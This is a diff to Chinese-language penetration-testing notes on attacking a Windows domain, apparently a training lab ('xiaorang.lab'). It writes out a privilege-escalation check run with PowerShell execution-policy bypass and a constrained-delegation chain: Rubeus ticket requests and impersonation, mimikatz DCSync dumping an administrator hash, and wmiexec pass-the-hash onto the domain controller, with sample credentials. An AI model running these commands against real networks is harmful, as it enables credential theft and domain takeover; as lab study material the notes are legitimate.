@@ -97,11 +97,12 @@ set smbuser administrator
 set smbpass 10c7c7894091834u1074eefddcef89ed79ec9f
 # 可以设置 payload 攻击时反弹也可不设置
 ```
-### PrivescCheck
+### 2. PrivescCheck
 
 检查有没有注册表相关选项.
 
 ```bash
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"
 domain_elevate\root_by_registry.sh
 ```
 
@@ -321,31 +322,21 @@ meterpreter > load kiwi
 meterpreter > creds_all
 ```
 
-约束委派攻击
+约束委派攻击 
 
-- 1. 通过 Rubeus 申请机器账户 MSSQLSERVER 的 TGT
+[攻击2 Rubeus_anchor](#rubeus)
 
 ```bash
+# 1. 通过 Rubeus 申请机器账户 MSSQLSERVER 的 TGT
 Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:<NTLM> /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
-```
-
-- 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
-
-```bash
+# 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjC....==
-```
-
-- 3. LDAP 服务具有 DCSync 权限，导出域内用户的 Hash
-
-```bash
+# 3. LDAP 服务具有 DCSync 权限，导出域内用户的 Hash
 mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
     kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
 # 获得域管理员哈希 1a19251fbd935969832616366ae3fe62
-```
 
-- 4. WMI 横向 登录域控
-
-```
+# 4. WMI 横向 登录域控
 python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
 
@@ -356,7 +347,7 @@ python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd93596983261
 
 ### Rubeus
 
-Rubeus 是用于测试 Kerberos 的利用工具。 如TGT请求/ST请求/AS-REP Roasting攻击/，Kerberoasting攻击/委派攻击/黄金票据/白银票据等。
+用于测试 Kerberos 的利用工具。 如TGT请求/ST请求/AS-REP Roasting攻击/，Kerberoasting攻击/委派攻击/黄金票据/白银票据等。
 
 Rubeus kerberoast 查看哪些域用户注册了 SPN，也为后续 Kerberoasting 做准备：
 
